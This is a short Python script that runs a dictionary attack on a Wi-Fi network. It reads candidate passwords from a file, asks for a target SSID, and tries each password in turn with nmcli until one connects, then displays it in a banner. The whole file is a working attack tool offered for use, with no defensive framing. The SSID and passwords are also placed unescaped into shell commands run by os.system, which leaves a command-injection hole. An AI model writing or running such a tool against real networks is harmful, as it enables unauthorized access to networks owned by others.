import os
import shutil
from tqdm import tqdm

password_file_path = 'passwords.txt'

ssid = input("Enter the SSID: ")

with open(password_file_path, 'r') as file:
    passwords = file.readlines()

password_found = False

def print_box(message):
    columns = shutil.get_terminal_size().columns
    box_width = columns - 4
    print()
    print(f'╔{"═" * box_width}╗')
    print(f'║{" " * box_width}║')
    print(f'║{message.center(box_width)}║')
    print(f'║{" " * box_width}║')
    print(f'╚{"═" * box_width}╝')

for password in tqdm(passwords, desc="Trying passwords"):
    password = password.strip()
    tqdm.write(f'Trying password: {password}')

    command = f'nmcli device wifi connect "{ssid}" password "{password}" 2>/dev/null'
    result = os.system(command)

    if result == 0:
        print_box(f'Password found: {password}')
        password_found = True
        break
    else:
        os.system('nmcli device disconnect wlan0 2>/dev/null')

if not password_found:
    print_box('Password not found!')
